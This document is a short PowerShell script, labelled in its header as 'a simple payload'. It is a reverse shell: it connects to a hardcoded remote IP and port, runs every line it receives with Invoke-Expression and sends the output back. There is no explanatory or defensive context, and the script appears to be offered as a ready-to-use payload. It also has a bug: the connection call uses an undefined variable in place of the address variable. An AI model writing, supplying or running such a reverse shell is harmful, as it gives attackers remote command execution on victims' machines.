###################################
# This I a simple payload TS 0/60 #
###################################



$naslov = "123.123.123.123"
$port = "1234"
$tcp = New-Object System.Net.Sockets.TcpClient($xxxx,$port)
$tcpstr = $tcp.GetStream()
$reader = New-Object System.IO.StreamReader($tcpstr)
$writer = New-Object System.IO.StreamWriter($tcpstr)
$writer.AutoFlush = $true
while ($tcp.Connected)
{
$x=Invoke-Expression $reader.ReadLine();
$y=Out-String -InputObject $x
$writer.WriteLine($y);
}
$reader.Close()
$writer.Close()
$tcp.Close()
